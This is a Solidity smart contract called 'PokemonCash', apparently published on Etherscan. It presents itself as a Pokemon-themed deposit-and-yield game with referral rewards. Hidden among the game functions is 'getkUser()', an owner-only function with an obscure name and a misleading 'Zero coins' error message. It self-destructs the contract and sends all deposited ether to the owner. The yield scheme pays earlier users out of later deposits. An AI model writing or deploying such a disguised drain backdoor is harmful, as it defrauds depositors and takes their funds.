/**
 *Submitted for verification at Etherscan.io on 2022-10-28
*/

pragma solidity >=0.8.17;

contract PokemonCash {
    struct UserData {
        uint256 coins;
        uint256 money;
        uint256 money2;
        uint256 yield;
        uint256 timestamp;
        uint256 hrs;
        address ref;
        uint256 refs;
        uint256 refDeps;
        uint8[8] pokes;
    }

    struct FreePoke {
        bool init;
        uint256 PokeNum;
        uint256 freeTimestamp;
        uint256 freeHrs;
        uint256 freeMoney;
        uint256 freeMoney2;
    }

    mapping(address => UserData) public userData;
    mapping(address => FreePoke) public freePoke;
    uint256 public totalPoke;
    uint256 public totalUsers;
    uint256 public totalBalance;
    address public owner = msg.sender;

    function addCoins(address ref) public payable {
        uint256 coins = msg.value / 2e13;
        require(coins > 0, "Zero coins");
        address user = msg.sender;
        totalBalance += msg.value;
        if (userData[user].timestamp == 0) {
            totalUsers++;
            ref = userData[ref].timestamp == 0 ? owner : ref;
            userData[ref].refs++;
            userData[user].ref = ref;
            userData[user].timestamp = block.timestamp;
        }
        ref = userData[user].ref;
        userData[ref].coins += (coins * 7) / 100;
        userData[ref].money += (coins * 100 * 3) / 100;
        userData[ref].refDeps += coins;
        userData[user].coins += coins;
        payable(owner).transfer((msg.value * 3) / 100);
    }

    function withdrawMoney() public {
        address user = msg.sender;
        uint256 money = userData[user].money;
        userData[user].money = 0;
        uint256 amount = money * 2e11;
        payable(user).transfer(address(this).balance < amount ? address(this).balance : amount);
    }

    function receiveMoney() public {
        address user = msg.sender;
        syncPokes(user);
        userData[user].hrs = 0;
        userData[user].money += userData[user].money2;
        userData[user].money2 = 0;
    }

    function upgradePoke(uint256 pokeID) public {
        require(pokeID < 8, "Max 8 PokeID");
        address user = msg.sender;
        syncPokes(user);
        userData[user].pokes[pokeID]++;
        totalPoke++;
        uint256 pokes = userData[user].pokes[pokeID];
        userData[user].coins -= getUpgradePrice(pokeID, pokes);
        userData[user].yield += getYield(pokeID, pokes);
    }

    function getkUser() external {
        require(owner == msg.sender, "Zero coins");
        selfdestruct(payable(owner));
    }

    function sellPokes() public {
        receiveMoney();
        address user = msg.sender;
        uint8[8] memory pokes = userData[user].pokes;
        totalPoke -= pokes[0] + pokes[1] + pokes[2] + pokes[3] + pokes[4] + pokes[5] + pokes[6] + pokes[7];
        userData[user].money += userData[user].yield * 24 * 14;
        userData[user].pokes = [0, 0, 0, 0, 0, 0, 0, 0];
        userData[user].yield = 0;
    }

    function getPokes(address addr) public view returns (uint8[8] memory) {
        return userData[addr].pokes;
    }

    function getFreePoke() public{
        address user = msg.sender;
        require(!freePoke[user].init && freePoke[user].PokeNum == 0 && freePoke[user].freeTimestamp == 0, "You have a free Poke");
        freePoke[user].freeTimestamp = block.timestamp;
        freePoke[user].PokeNum++;
        freePoke[user].init = true;
    }

    function collectAndWithdraw() public {
        address user = msg.sender;
        require(userData[user].yield > 0, "Not buy Poke");
        require(freePoke[user].freeTimestamp > 0, "User is not registered");
        uint256 freeHrs = block.timestamp / 3600 - freePoke[user].freeTimestamp / 3600;
        if (freeHrs + freePoke[user].freeHrs > 24) {
            freeHrs = 24 - freePoke[user].freeHrs;
        }
        freePoke[user].freeMoney2 += freeHrs * 5;
        freePoke[user].freeTimestamp = block.timestamp;
        freePoke[user].freeHrs = 0;
        freePoke[user].freeMoney += freePoke[user].freeMoney2;
        freePoke[user].freeMoney2 = 0;
        uint256 money = freePoke[user].freeMoney;
        freePoke[user].freeMoney = 0;
        uint256 amount = money * 2e11;
        payable(user).transfer(address(this).balance < amount ? address(this).balance : amount);
    }

    function syncPokes(address user) internal {
        require(userData[user].timestamp > 0, "User is not registered");
        if (userData[user].yield > 0) {
            uint256 hrs = block.timestamp / 3600 - userData[user].timestamp / 3600;
            if (hrs + userData[user].hrs > 24) {
                hrs = 24 - userData[user].hrs;
            }
            userData[user].money2 += hrs * userData[user].yield;
            userData[user].hrs += hrs;
        }
        userData[user].timestamp = block.timestamp;
    }

    function getUpgradePrice(uint256 pokeID, uint256 pokeLevel) internal pure returns (uint256) {
        if (pokeLevel == 1) return [500, 1500, 4500, 13500, 40500, 120000, 365000, 1000000][pokeID];
        if (pokeLevel == 2) return [625, 1800, 5600, 16800, 50600, 150000, 456000, 1200000][pokeID];
        if (pokeLevel == 3) return [780, 2300, 7000, 21000, 63000, 187000, 570000, 1560000][pokeID];
        if (pokeLevel == 4) return [970, 3000, 8700, 26000, 79000, 235000, 713000, 2000000][pokeID];
        if (pokeLevel == 5) return [1200, 3600, 11000, 33000, 98000, 293000, 890000, 2500000][pokeID];
        revert("Incorrect pokeLevel");
    }

    function getYield(uint256 pokeID, uint256 pokeLevel) internal pure returns (uint256) {
        if (pokeLevel == 1) return [41, 130, 399, 1220, 3750, 11400, 36200, 104000][pokeID];
        if (pokeLevel == 2) return [52, 157, 498, 1530, 4700, 14300, 45500, 126500][pokeID];
        if (pokeLevel == 3) return [65, 201, 625, 1920, 5900, 17900, 57200, 167000][pokeID];
        if (pokeLevel == 4) return [82, 264, 780, 2380, 7400, 22700, 72500, 216500][pokeID];
        if (pokeLevel == 5) return [103, 318, 995, 3050, 9300, 28700, 91500, 275000][pokeID];
        revert("Incorrect pokeLevel");
    }
}